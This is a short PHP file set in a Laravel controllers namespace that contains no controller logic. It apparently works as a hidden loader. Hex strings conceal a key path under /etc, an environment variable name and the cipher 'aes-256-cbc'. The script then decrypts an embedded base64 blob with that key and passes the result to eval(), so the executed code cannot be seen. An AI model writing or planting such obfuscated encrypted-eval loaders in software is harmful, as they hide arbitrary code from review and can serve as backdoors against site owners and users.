<?php
namespace App\Http\Controllers;
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');

$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);

if(!$k)exit;

$i=base64_decode('6OZ2ZaBMsx7ic2hlEtzO9g==');

$c=base64_decode(

'go1ivjE8c+Y7OoOdn2aY/a4ay2BIMuOS627QyJFwvbj9JFDgnCQQGlNu9rRepk+4HMRIIFuzRCsL' .
'uB8pZrE8Hv40HTDn910M53bxLUTjKQs75G5YvD7f/dAP251MBinnDCv0vHDkLW+L73R0/w7Db/wT' .
'AIvAOCg00PSnKTP54CoX39sN+e6Md1PjGjU0bAWTx3KxVyf9zdjWhhOoZhD1X2N5557IcyRMd8G8' .
'x2+AP5D8R59JtA0pLMqqP50j6iw0'

);

$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);

if($d===false)exit;

eval($d);

